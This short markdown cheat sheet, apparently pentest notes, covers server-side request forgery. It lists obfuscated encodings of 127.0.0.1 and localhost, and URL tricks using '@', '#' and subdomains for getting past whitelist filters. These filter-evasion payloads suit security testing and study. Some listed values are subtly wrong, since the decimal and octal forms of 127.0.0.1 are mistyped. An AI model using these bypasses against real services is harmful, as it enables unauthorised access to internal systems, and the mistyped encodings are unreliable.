# SSRF
**Look for queries that access backend systems**

## Alternative Localhost
### 127.0.0.1
- `21307064330`
- `17700000001`
- `127.1`
- Registering Domain to redirect to `127.0.0.1`
### Localhost
- `lOcAlHoSt`
- `%6c%6f%63%61%6c%68%6f%73%74`
- Registering Domain to redirect to `localhost`

## Whitelists
**Useful to URL-Encode special chars (@, #, .)**
- `http://<NORMAL>@<SSRF URL>/<PATH>`
- `http://<SSRF URL>#<NORMAL>/<PATH>`
- `http://<NORMAL>.<DOMAIN>`